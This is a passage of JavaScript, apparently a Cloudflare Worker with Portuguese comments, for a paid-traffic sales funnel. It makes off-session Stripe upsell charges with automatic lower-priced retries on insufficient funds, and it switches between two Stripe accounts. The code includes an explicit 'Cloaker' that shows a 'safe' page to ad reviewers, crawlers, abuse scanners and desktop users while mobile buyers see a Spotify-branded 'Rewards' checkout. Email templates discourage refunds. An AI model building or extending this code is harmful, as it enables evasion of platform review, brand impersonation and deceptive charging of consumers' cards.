    if (url.pathname === '/api/stripe-charge-upsell' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { customer_id, payment_method_id, upsell_number, email, name } = body;
        
        const urlParamsFromRequest = Object.fromEntries(url.searchParams.entries());
        const extraParams = { ...urlParamsFromRequest, ...(body.extra_params || {}) };

        if (!customer_id || !payment_method_id) return new Response(JSON.stringify({ ok: false, error: 'Missing parameters' }), { status: 400, headers: corsHeaders });

        const isUp1 = upsell_number === 1 || upsell_number === '1';

        // 🔴 Resolve a conta Stripe do Upsell (baseado na conta onde o Front comprou)
        let upsellAcc = body.stripe_account || body.acc || extraParams.acc || url.searchParams.get('acc') || 'a';
        let upsellStripeCreds = getStripeCredentials(upsellAcc, isTestMode);
        let upsellSecretKey = upsellStripeCreds.secretKey;
        
        // 🔴 CHECAGEM DE SEGURANÇA E RESILIÊNCIA MULTI-CONTA
        let checkCustomerRes = await fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
           headers: { 'Authorization': `Bearer ${upsellSecretKey}` }
        });
        let customerObj = await checkCustomerRes.json();

        // 🛡️ Se o customer não existir nesta conta Stripe, tenta imediatamente na outra!
        if (customerObj.error && (customerObj.error.code === 'resource_missing' || customerObj.error.message?.includes('No such customer'))) {
          const altAcc = upsellAcc === 'b' ? 'a' : 'b';
          const altCreds = getStripeCredentials(altAcc, isTestMode);
          const altRes = await fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
            headers: { 'Authorization': `Bearer ${altCreds.secretKey}` }
          });
          const altCustomer = await altRes.json();
          if (!altCustomer.error) {
            upsellAcc = altAcc;
            upsellStripeCreds = altCreds;
            upsellSecretKey = altCreds.secretKey;
            customerObj = altCustomer;
          }
        }

        // 🔴 RESOLUÇÃO ROBUSTA DE NOME NO UPSELL
        const custName = (customerObj && customerObj.name && customerObj.name.toLowerCase() !== 'customer') ? customerObj.name : '';
        const metaName = (customerObj && customerObj.metadata && customerObj.metadata.name && customerObj.metadata.name.toLowerCase() !== 'customer') ? customerObj.metadata.name 
          : ((customerObj && customerObj.metadata && customerObj.metadata.nome && customerObj.metadata.nome.toLowerCase() !== 'customer') ? customerObj.metadata.nome : '');
        const bodyName = (name && typeof name === 'string' && name.trim().toLowerCase() !== 'customer') ? name.trim() : '';
        const extraName = (extraParams.name && extraParams.name.toLowerCase() !== 'customer') ? extraParams.name.trim() 
          : ((extraParams.nome && extraParams.nome.toLowerCase() !== 'customer') ? extraParams.nome.trim() : '');

        const resolvedName = bodyName || custName || metaName || extraName || 'Customer';

        // Se o cliente na Stripe ainda estava com nome 'Customer' ou vazio, atualiza agora
        if (resolvedName !== 'Customer' && (!customerObj.name || customerObj.name.toLowerCase() === 'customer')) {
          ctx.waitUntil(fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${upsellSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ name: resolvedName }).toString()
          }));
        }

        // Se der falha (qualquer uma), joga direto pra Obrigado porque o cliente foi recusado
        const nextUrl = appendParams(FINAL_THANKS_URL, { ...extraParams, email, name: resolvedName, declined: 'true', acc: upsellAcc });
        
        if (customerObj.metadata && (customerObj.metadata.out_of_funds === 'true' || customerObj.metadata.declined === 'true')) {
           return new Response(JSON.stringify({ ok: true, status: 'declined', amount: 0, next_url: nextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
        }

        if (isUp1) {
          // =======================================================
          // UPSELL 1: TIER 1 ($27.90) OU DEMAIS PAÍSES ($15.00)
          // =======================================================
          const customerCountry = (customerObj && customerObj.address && customerObj.address.country) 
            || (customerObj && customerObj.metadata && customerObj.metadata.country) 
            || extraParams.country 
            || clientCountry;
          const isTier1 = isTier1Country(customerCountry);
          let amount = isTier1 ? 2790 : 1500;
          const candidatePrice = body.price_cents || extraParams.price_cents;
          if (candidatePrice && (Number(candidatePrice) === 2790 || Number(candidatePrice) === 1500 || Number(candidatePrice) === 590)) {
            amount = Number(candidatePrice);
          }
          let description = 'wellness-protocol VIP (Upsell 1)';
          if (amount === 2790) description = 'wellness-protocol VIP (Upsell 1 - $27.90)';
          else if (amount === 590) description = 'wellness-protocol VIP (Upsell 1 - $5.90)';
          else if (amount === 1500) description = 'wellness-protocol VIP (Upsell 1 - $15.00)';

          const customerCurrency = (customerObj && customerObj.metadata && customerObj.metadata.currency)
            || extraParams.currency 
            || resolveSmartCurrency(customerCountry) 
            || FALLBACK_CURRENCY;

          const piParams = new URLSearchParams();
          piParams.append('amount', amount.toString());
          piParams.append('currency', customerCurrency);
          piParams.append('customer', customer_id);
          piParams.append('payment_method', payment_method_id);
          piParams.append('off_session', 'true');
          piParams.append('confirm', 'true');
          piParams.append('description', description);
          piParams.append('automatic_payment_methods[enabled]', 'true');
          piParams.append('automatic_payment_methods[allow_redirects]', 'never');
          
          for (const [k, v] of Object.entries(extraParams)) {
            if (k && v) piParams.append(`metadata[${k.substring(0, 40)}]`, v.substring(0, 500));
          }

          const up1IdempotencyKey = `up1_${customer_id}_${payment_method_id}_${amount}`;
          const piRes = await fetch('https://api.stripe.com/v1/payment_intents', {
            method: 'POST',
            headers: { 
              'Authorization': `Bearer ${upsellSecretKey}`, 
              'Content-Type': 'application/x-www-form-urlencoded',
              'Idempotency-Key': up1IdempotencyKey
            },
            body: piParams.toString()
          });
          const paymentIntent = await piRes.json();

          if (paymentIntent.error) {
              const declineCode = paymentIntent.error.decline_code;

              // 🔴 BLINDAGEM MÁXIMA: Se deu "Não autorizar" (do_not_honor) ou qualquer erro que não seja saldo:
              // NUNCA tenta downsell e bloqueia permanentemente qualquer oferta seguinte!
              if (declineCode !== 'insufficient_funds') {
                  ctx.waitUntil(fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
                      method: 'POST', headers: { 'Authorization': `Bearer ${upsellSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
                      body: new URLSearchParams({ 'metadata[out_of_funds]': 'true', 'metadata[declined]': 'true' }).toString()
                  }));
                  return new Response(JSON.stringify({ ok: true, status: 'declined', amount: 0, next_url: nextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
              }

              // SÓ tenta o Downsell se for ESTRITAMENTE falta de saldo ('insufficient_funds')
              const fallbackParams = new URLSearchParams(piParams);
              fallbackParams.set('amount', '590');
              fallbackParams.set('description', description + ' (Downsell $5.90)');

              await new Promise(r => setTimeout(r, 2000)); 

              const up1FbIdempotencyKey = `up1_fb_${customer_id}_${payment_method_id}_590`;
              const retryRes = await fetch('https://api.stripe.com/v1/payment_intents', {
                  method: 'POST',
                  headers: { 
                    'Authorization': `Bearer ${upsellSecretKey}`, 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Idempotency-Key': up1FbIdempotencyKey
                  },
                  body: fallbackParams.toString()
              });
              const retryIntent = await retryRes.json();
              
              if (!retryIntent.error && retryIntent.status === 'succeeded') {
                   const up1Phone = (customerObj && customerObj.phone) || extraParams.phone || '';
                   const up1Country = (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry;
                   ctx.waitUntil(sendCAPIEvent('Purchase', {
                     email: email || (customerObj && customerObj.email) || '',
                     phone: up1Phone,
                     name: resolvedName,
                     country: up1Country,
                     eventId: retryIntent.id,
                     externalId: customer_id || email,
                     value: 5.90,
                     currency: customerCurrency,
                     fbclid: extraParams.fbclid
                   }, request, activePixelConfigs));
                   
                   if (UTMIFY_TOKEN) {
                     ctx.waitUntil(sendUtmifyOrder({
                       orderId: retryIntent.id,
                       platform: 'wellness-protocol',
                       name: resolvedName,
                       email: email || (customerObj && customerObj.email) || '',
                       phone: (customerObj && customerObj.phone) || extraParams.phone || null,
                       country: (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry,
                       productId: 'downsell_1',
                       productName: 'Downsell 1',
                       priceInCents: 590,
                       currency: customerCurrency,
                       trackingParameters: extraParams
                     }, request, UTMIFY_TOKEN, isTestMode));
                   }

                   extraParams.max_balance = '590'; 
                   // 🔴 OTIMIZAÇÃO: Se caiu no fallback de $5.90 por falta de saldo, encerra o funil aqui e vai direto pro Obrigado com acesso liberado!
                   const updatedNextUrl = appendParams(FINAL_THANKS_URL, { ...extraParams, cid: customer_id, pm: payment_method_id, acc: upsellAcc, email, name: resolvedName, currency: customerCurrency });
                   return new Response(JSON.stringify({ ok: true, status: retryIntent.status, amount: 590, next_url: updatedNextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
              } else {
                   // Se o downsell também falhar, marca o cliente para nunca mais tentar
                   ctx.waitUntil(fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
                       method: 'POST',
                       headers: { 'Authorization': `Bearer ${upsellSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
                       body: new URLSearchParams({ 'metadata[out_of_funds]': 'true', 'metadata[declined]': 'true' }).toString()
                   }));
                   return new Response(JSON.stringify({ ok: true, status: 'declined', amount: 0, next_url: nextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
              }
          }

          if (paymentIntent.status !== 'succeeded' && paymentIntent.status !== 'requires_capture') {
              return new Response(JSON.stringify({ ok: true, status: paymentIntent.status, amount: 0, next_url: nextUrl }), { headers: corsHeaders });
          }

          // Dispara CAPI para o Upsell 1 aprovado com dados completos
          const up1Phone = (customerObj && customerObj.phone) || extraParams.phone || '';
          const up1Country = (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry;
          ctx.waitUntil(sendCAPIEvent('Purchase', {
            email: email || (customerObj && customerObj.email) || '',
            phone: up1Phone,
            name: resolvedName,
            country: up1Country,
            eventId: paymentIntent.id,
            externalId: customer_id || email,
            value: amount / 100,
            currency: customerCurrency,
            fbclid: extraParams.fbclid
          }, request, activePixelConfigs));

          if (UTMIFY_TOKEN) {
            const up1ProdId = amount === 590 ? 'downsell_1' : 'upsell_1';
            const up1ProdName = amount === 590 ? 'Upsell 1 ($5.90)' : (amount === 2790 ? 'Upsell 1 ($27.90)' : 'Upsell 1 ($15.00)');
            ctx.waitUntil(sendUtmifyOrder({
              orderId: paymentIntent.id,
              platform: 'wellness-protocol',
              name: resolvedName,
              email: email || (customerObj && customerObj.email) || '',
              phone: (customerObj && customerObj.phone) || extraParams.phone || null,
              country: (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry,
              productId: up1ProdId,
              productName: up1ProdName,
              priceInCents: amount,
              currency: customerCurrency,
              trackingParameters: extraParams
            }, request, UTMIFY_TOKEN, isTestMode));
          }

          extraParams.max_balance = amount.toString();
          const safeCampaign = (extraParams.utm_campaign && extraParams.utm_campaign.toLowerCase().includes('spot')) 
            ? extraParams.utm_campaign 
            : (extraParams.utm_campaign ? `${extraParams.utm_campaign}_spot` : 'spot');
          const successNextUrl = (amount === 590)
            ? appendParams(FINAL_THANKS_URL, { ...extraParams, acc: upsellAcc, email, name: resolvedName, currency: customerCurrency })
            : appendParams(UP2_URL, { ...extraParams, utm_campaign: safeCampaign, cid: customer_id, pm: payment_method_id, acc: upsellAcc, email, name: resolvedName, currency: customerCurrency });
          return new Response(JSON.stringify({ ok: true, status: paymentIntent.status, amount: amount, next_url: successNextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });

        } else {
          // =======================================================
          // UPSELL 2: PAGAMENTO ÚNICO DE $17.90 (COM CASCATA)
          // =======================================================
          let amount = FALLBACK_UP2_PRICE_CENTS;
          const description = 'Upsell 2 - Oferta';

          const customerCountry = (customerObj && customerObj.address && customerObj.address.country) 
            || (customerObj && customerObj.metadata && customerObj.metadata.country) 
            || extraParams.country 
            || clientCountry;
          const customerCurrency = (customerObj && customerObj.metadata && customerObj.metadata.currency)
            || extraParams.currency 
            || resolveSmartCurrency(customerCountry) 
            || FALLBACK_CURRENCY;

          const piParams = new URLSearchParams();
          piParams.append('amount', amount.toString());
          piParams.append('currency', customerCurrency);
          piParams.append('customer', customer_id);
          piParams.append('payment_method', payment_method_id);
          piParams.append('off_session', 'true');
          piParams.append('confirm', 'true');
          piParams.append('description', description);
          piParams.append('automatic_payment_methods[enabled]', 'true');
          piParams.append('automatic_payment_methods[allow_redirects]', 'never');
          
          for (const [k, v] of Object.entries(extraParams)) {
            if (k && v) piParams.append(`metadata[${k.substring(0, 40)}]`, v.substring(0, 500));
          }

          const up2IdempotencyKey = `up2_${customer_id}_${payment_method_id}_${amount}`;
          const piRes = await fetch('https://api.stripe.com/v1/payment_intents', {
            method: 'POST',
            headers: { 
              'Authorization': `Bearer ${upsellSecretKey}`, 
              'Content-Type': 'application/x-www-form-urlencoded',
              'Idempotency-Key': up2IdempotencyKey
            },
            body: piParams.toString()
          });
          const paymentIntent = await piRes.json();

          if (paymentIntent.error) {
              const declineCode = paymentIntent.error.decline_code;

              // 🔴 BLINDAGEM MÁXIMA: Se deu "Não autorizar" (do_not_honor) ou qualquer erro que não seja saldo:
              // NUNCA tenta downsell de $5.90! Pára imediatamente e manda pro Obrigado.
              if (declineCode !== 'insufficient_funds') {
                  ctx.waitUntil(fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
                      method: 'POST', headers: { 'Authorization': `Bearer ${upsellSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
                      body: new URLSearchParams({ 'metadata[out_of_funds]': 'true', 'metadata[declined]': 'true' }).toString()
                  }));
                  return new Response(JSON.stringify({ ok: true, status: 'declined', amount: 0, next_url: nextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
              }

              // SÓ tenta o Downsell se for ESTRITAMENTE falta de saldo ('insufficient_funds')
              const fallbackParams = new URLSearchParams(piParams);
              fallbackParams.set('amount', '590');
              fallbackParams.set('description', description + ' (Downsell $5.90)');

              await new Promise(r => setTimeout(r, 2000)); 

              const up2FbIdempotencyKey = `up2_fb_${customer_id}_${payment_method_id}_590`;
              const retryRes = await fetch('https://api.stripe.com/v1/payment_intents', {
                  method: 'POST',
                  headers: { 
                    'Authorization': `Bearer ${upsellSecretKey}`, 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Idempotency-Key': up2FbIdempotencyKey
                  },
                  body: fallbackParams.toString()
              });
              const retryIntent = await retryRes.json();
              
              if (!retryIntent.error && retryIntent.status === 'succeeded') {
                   // Dispara CAPI para o Downsell do Upsell 2 aprovado com dados completos
                   const up2Phone = (customerObj && customerObj.phone) || extraParams.phone || '';
                   const up2Country = (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry;
                   ctx.waitUntil(sendCAPIEvent('Purchase', {
                     email: email || (customerObj && customerObj.email) || '',
                     phone: up2Phone,
                     name: resolvedName,
                     country: up2Country,
                     eventId: retryIntent.id,
                     externalId: customer_id || email,
                     value: 5.90,
                     currency: customerCurrency,
                     fbclid: extraParams.fbclid
                   }, request, activePixelConfigs));
                   
                   if (UTMIFY_TOKEN) {
                     ctx.waitUntil(sendUtmifyOrder({
                       orderId: retryIntent.id,
                       platform: 'wellness-protocol',
                       name: resolvedName,
                       email: email || (customerObj && customerObj.email) || '',
                       phone: (customerObj && customerObj.phone) || extraParams.phone || null,
                       country: (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry,
                       productId: 'downsell_2',
                       productName: 'Downsell 2',
                       priceInCents: 590,
                       currency: customerCurrency,
                       trackingParameters: extraParams
                     }, request, UTMIFY_TOKEN, isTestMode));
                   }

                   extraParams.max_balance = '590'; 
                   const updatedNextUrl = appendParams(FINAL_THANKS_URL, { ...extraParams, acc: upsellAcc, email, name: resolvedName, currency: customerCurrency });
                   return new Response(JSON.stringify({ ok: true, status: retryIntent.status, amount: 590, next_url: updatedNextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
              } else {
                   // Se o downsell também falhar, marca o cliente para nunca mais tentar
                   ctx.waitUntil(fetch(`https://api.stripe.com/v1/customers/${customer_id}`, {
                       method: 'POST',
                       headers: { 'Authorization': `Bearer ${upsellSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
                       body: new URLSearchParams({ 'metadata[out_of_funds]': 'true', 'metadata[declined]': 'true' }).toString()
                   }));
                   return new Response(JSON.stringify({ ok: true, status: 'declined', amount: 0, next_url: nextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
              }
          }

          if (paymentIntent.status !== 'succeeded' && paymentIntent.status !== 'requires_capture') {
              return new Response(JSON.stringify({ ok: true, status: paymentIntent.status, amount: 0, next_url: nextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
          }

          // Dispara CAPI para o Upsell 2 completo aprovado com dados completos
          const up2Phone = (customerObj && customerObj.phone) || extraParams.phone || '';
          const up2Country = (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry;
          ctx.waitUntil(sendCAPIEvent('Purchase', {
            email: email || (customerObj && customerObj.email) || '',
            phone: up2Phone,
            name: resolvedName,
            country: up2Country,
            eventId: paymentIntent.id,
            externalId: customer_id || email,
            value: amount / 100,
            currency: customerCurrency,
            fbclid: extraParams.fbclid
          }, request, activePixelConfigs));

          if (UTMIFY_TOKEN) {
            ctx.waitUntil(sendUtmifyOrder({
              orderId: paymentIntent.id,
              platform: 'wellness-protocol',
              name: resolvedName,
              email: email || (customerObj && customerObj.email) || '',
              phone: (customerObj && customerObj.phone) || extraParams.phone || null,
              country: (customerObj && customerObj.address && customerObj.address.country) || extraParams.country || clientCountry,
              productId: 'upsell_2',
              productName: 'Upsell 2',
              priceInCents: amount,
              currency: customerCurrency,
              trackingParameters: extraParams
            }, request, UTMIFY_TOKEN, isTestMode));
          }

          extraParams.max_balance = amount.toString();
          const successNextUrl = appendParams(FINAL_THANKS_URL, { ...extraParams, acc: upsellAcc, email, name: resolvedName, currency: customerCurrency });
          return new Response(JSON.stringify({ ok: true, status: paymentIntent.status, amount: amount, next_url: successNextUrl, stripe_account: upsellAcc }), { headers: corsHeaders });
        }

      } catch (err) {
        return new Response(JSON.stringify({ ok: false, error: err.message }), { status: 500, headers: corsHeaders });
      }
    }

    if (url.pathname === '/up1' || url.pathname === '/upsell1') {
      if (url.searchParams.get('declined') === 'true' || url.searchParams.get('out_of_funds') === 'true') {
        return Response.redirect(appendParams(FINAL_THANKS_URL, Object.fromEntries(url.searchParams.entries())), 302);
      }
      return Response.redirect(appendParams(UP1_URL, Object.fromEntries(url.searchParams.entries())), 302);
    }
    
    if (url.pathname === '/refund' || url.pathname === '/reembolso' || url.pathname === '/refound') {
      return Response.redirect(appendParams('https://spoflow.shop/refund', Object.fromEntries(url.searchParams.entries())), 302);
    }

    if (url.pathname === '/up2' || url.pathname === '/upsell2') {
      if (url.searchParams.get('declined') === 'true' || url.searchParams.get('out_of_funds') === 'true') {
        return Response.redirect(appendParams(FINAL_THANKS_URL, Object.fromEntries(url.searchParams.entries())), 302);
      }
      return Response.redirect(appendParams(UP2_URL, Object.fromEntries(url.searchParams.entries())), 302);
    }

    // ────────────────────────────────────────────────────────────────────────
    // 4. RENDERIZAÇÃO DO CHECKOUT
    // ────────────────────────────────────────────────────────────────────────
        // Sorteia ou seleciona a conta Stripe para renderização
    const renderAcc = url.searchParams.get('acc') || selectStripeAccount(url);
    const renderStripeCreds = getStripeCredentials(renderAcc, isTestMode);
    const renderPublicKey = renderStripeCreds.publicKey;

    // 🛡️ Cloaker: Desktop e Bots recebem Safe (White); Celular (Mobile) recebe Spotify Rewards (Black)
    const isPaid = isPaidTrafficRequest(url, request);

    if (!isPaid) {
      return new Response(renderSafeCheckoutHTML(renderPublicKey, FALLBACK_FRONT_PRICE_CENTS, clientCountry, renderAcc), {
        headers: { 'Content-Type': 'text/html; charset=utf-8' }
      });
    }

    return new Response(renderCheckoutHTML(renderPublicKey, FALLBACK_FRONT_PRICE_CENTS, activePixelIds, clientCountry, renderAcc, request), {
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
    } catch (globalErr) {
      console.error('[CRITICAL WORKER ERROR]', globalErr);
      return new Response('CRITICAL WORKER ERROR:\r\n' + (globalErr && globalErr.stack ? globalErr.stack : String(globalErr)), {
        status: 200,
        headers: { 'Content-Type': 'text/plain; charset=utf-8' }
      });
    }
  }
};

// ─── UTILS DE ROTEAMENTO E FETCH ───

// ─── CLOAKING / DETECÇÃO DE TRÁFEGO PAGO ───
// -------------------------------------------------------------------------------------
// 🛡️ CLOAKING / DETECÇÃO DE DISPOSITIVO & PROTEÇÃO DESKTOP 🛡️
// -------------------------------------------------------------------------------------
function isMobileDevice(request) {
  const ua = (request && request.headers && (request.headers.get('user-agent') || request.headers.get('User-Agent'))) || '';
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
}

function isBotOrCrawler(request) {
  const ua = (request && request.headers && (request.headers.get('user-agent') || request.headers.get('User-Agent'))) || '';
  return /facebookexternalhit|Facebot|MetaInspector|Googlebot|bingbot|Baiduspider|DuckDuckBot|YandexBot|Sogou|ByteDance|TikTokBot|crawler|spider|robot|crawling|netcraft|radix|abuse|scanner|headless|phantom|puppeteer|lighthouse/i.test(ua);
}

function isPaidTrafficRequest(url, request) {
  // Permite forçar manualmente para testes: ?preview=safe (white) ou ?preview=black / ?preview=paid (black)
  const preview = (url.searchParams.get('preview') || url.searchParams.get('view') || url.searchParams.get('modo') || '').toLowerCase();
  if (preview === 'safe' || preview === 'white' || url.searchParams.get('safe') === '1') return false;
  if (preview === 'paid' || preview === 'spot' || preview === 'spotify' || preview === 'black' || url.searchParams.get('black') === '1' || url.searchParams.get('mobile') === '1') return true;

  // 1. Bots, crawlers e revisores sempre recebem a página Safe (White)
  if (isBotOrCrawler(request)) return false;

  // 2. Proteção Desktop: tráfego vindo de desktop/computador recebe Safe (White)
  const isMobile = isMobileDevice(request);
  if (!isMobile) {
    return false; // Desktop protegido -> Safe White!
  }

  // 3. Tráfego Mobile (celular) recebe o Checkout oficial Spotify (Black)
  return true;
}

function appendParams(baseUrl, paramsObj) {
  try {
    const parsed = new URL(baseUrl);
    for (const [key, value] of Object.entries(paramsObj || {})) {
      if (value) parsed.searchParams.set(key, value);
    }
    return parsed.toString();
  } catch (e) {
    let sep = baseUrl.includes('?') ? '&' : '?';
    const qs = Object.entries(paramsObj || {}).filter(([_, v]) => v).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    return qs ? `${baseUrl}${sep}${qs}` : baseUrl;
  }
}

async function fetchStripePrice(apiKey, priceId) {
  try {
    const res = await fetch(`https://api.stripe.com/v1/prices/${priceId}`, { headers: { 'Authorization': `Bearer ${apiKey}` } });
    return res.ok ? await res.json() : null;
  } catch (e) { return null; }
}

function getWelcomeHtml(name, appUrl, refundLink) {
  const safeName = (name || 'Member').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const safeRefundUrl = refundLink || 'https://SEU_WORKER_SUPORTE.workers.dev/refund';
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your Access is Ready</title>
  <style>
    * { box-sizing: border-box !important; }
    body, html { margin: 0 !important; padding: 0 !important; width: 100% !important; background-color: #07090b !important; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
    table { border-collapse: collapse !important; mso-table-lspace: 0pt !important; mso-table-rspace: 0pt !important; }
    td { padding: 0; }
    a { text-decoration: none; }
    @media only screen and (max-width: 480px) {
      .outer-td { padding: 12px 6px !important; }
      .email-card { padding: 22px 16px !important; border-radius: 14px !important; }
      .email-h1 { font-size: 20px !important; line-height: 1.3 !important; }
      .email-p { font-size: 13px !important; line-height: 1.5 !important; }
      .btn-main { padding: 13px 18px !important; font-size: 14px !important; }
    }
  </style>
</head>
<body style="margin: 0; padding: 0; background-color: #07090b; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #ffffff;">
  <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #07090b;">
    <tr>
      <td class="outer-td" align="center" style="padding: 24px 12px;">
        <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 440px; margin: 0 auto;">
          <tr>
            <td class="email-card" style="background-color: #0f1216; border: 1px solid #1c212a; border-radius: 18px; padding: 32px 24px; text-align: center; color: #ffffff;">
              <div style="display: inline-block; background-color: rgba(29, 185, 84, 0.12); color: #1DB954; font-size: 10px; font-weight: 700; letter-spacing: 1.5px; padding: 5px 14px; border-radius: 20px; text-transform: uppercase; margin-bottom: 20px;">
                MEMBER ACCESS
              </div>
              <h1 class="email-h1" style="font-size: 22px; font-weight: 800; margin: 0 0 14px 0; color: #ffffff; letter-spacing: -0.3px;">
                Welcome! Your access is ready.
              </h1>
              <p class="email-p" style="font-size: 13px; line-height: 1.55; color: #8c93a3; margin: 0 0 22px 0;">
                Your digital member access has been successfully activated, <strong style="color: #ffffff;">${safeName}</strong>.<br><br>
                Click the button below to access your dashboard:
              </p>
              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-bottom: 24px;">
                <tr>
                  <td align="center">
                    <a href="${appUrl}" target="_blank" class="btn-main" style="display: block; width: 100%; box-sizing: border-box; background-color: #1DB954; color: #000000; font-size: 14px; font-weight: 800; text-decoration: none; padding: 15px 20px; border-radius: 30px; text-align: center;">
                      ACCESS MY APP
                    </a>
                  </td>
                </tr>
              </table>
              <div style="background-color: rgba(255, 184, 0, 0.05); border: 1px solid rgba(255, 184, 0, 0.22); border-radius: 10px; padding: 14px 16px; text-align: left; margin-bottom: 20px;">
                <p style="margin: 0 0 6px 0; font-size: 11px; line-height: 1.45; color: #d6d9e0;">
                  A refund does <strong>not</strong> speed up your report. It only <strong>cancels your access completely</strong> — the scan and the results stop.
                </p>
                <p style="margin: 0; font-size: 11px; color: #8c93a3;">
                  Need a refund? <a href="${safeRefundUrl}" style="color: #1DB954; text-decoration: underline;">Request a refund</a>
                </p>
              </div>
              <p style="font-size: 11px; color: #4f5869; margin: 0; line-height: 1.4;">
                We recommend saving this email so you can easily access your account again anytime.
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}


function getRefundConfirmationHtml(name, amountFormatted, cardLast4, refundDate, refundId, arn) {
  const cleanName = (name && name.trim().toLowerCase() !== 'customer') ? name.trim() : 'Valued Customer';
  const arnRow = arn ? `
    <tr>
      <td style="padding:14px 20px;border-top:1px solid #21262d;color:#8b949e;font-size:13px;">Bank Acquirer Ref (ARN):</td>
      <td style="padding:14px 20px;border-top:1px solid #21262d;color:#79c0ff;font-family:monospace;font-size:12px;text-align:right;">${arn}</td>
    </tr>` : '';
  const arnMention = arn ? ` or Acquirer Reference Number (ARN: ${arn})` : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Refund Confirmation</title>
</head>
<body style="margin:0;padding:0;background-color:#0d1117;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#e6edf3;">
  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#0b0e14;padding:40px 15px;">
    <tr>
      <td align="center">
        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="max-width:540px;background-color:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,0.5);">
          <tr>
            <td style="background-color:#101923;padding:24px 32px;border-bottom:1px solid #21262d;">
              <table width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td align="left">
                    <span style="display:inline-block;background-color:rgba(46,160,67,0.15);color:#3fb950;border:1px solid rgba(46,160,67,0.4);font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:5px 12px;border-radius:20px;">
                      &#10003; REFUND PROCESSED
                    </span>
                  </td>
                  <td align="right" style="color:#8b949e;font-size:12px;">
                    Official Receipt
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px 32px 24px 32px;">
              <h1 style="margin:0 0 16px 0;font-size:22px;font-weight:700;color:#ffffff;line-height:1.3;">
                Your refund has been issued
              </h1>
              <p style="margin:0 0 20px 0;font-size:15px;color:#c9d1d9;line-height:1.6;">
                Hello <strong>${cleanName}</strong>,
              </p>
              <p style="margin:0 0 24px 0;font-size:14px;color:#8b949e;line-height:1.6;">
                This email confirms that your refund has been successfully initiated by our billing department and returned to your original payment method.
              </p>
              <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#0d1117;border:1px solid #30363d;border-radius:8px;margin-bottom:24px;">
                <tr>
                  <td style="padding:16px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">Total Refunded:</td>
                  <td style="padding:16px 20px;border-bottom:1px solid #21262d;color:#3fb950;font-size:15px;font-weight:700;text-align:right;">${amountFormatted}</td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">Payment Method:</td>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#e6edf3;font-size:13px;text-align:right;">Card ending in <strong>${cardLast4}</strong></td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">Processed Date:</td>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#e6edf3;font-size:13px;text-align:right;">${refundDate}</td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;color:#8b949e;font-size:13px;">Reference ID:</td>
                  <td style="padding:14px 20px;color:#79c0ff;font-family:monospace;font-size:12px;text-align:right;">${refundId}</td>
                </tr>
                ${arnRow}
              </table>
              <div style="background-color:rgba(56,139,253,0.1);border-left:3px solid #388bfd;padding:14px 16px;border-radius:4px;margin-bottom:24px;">
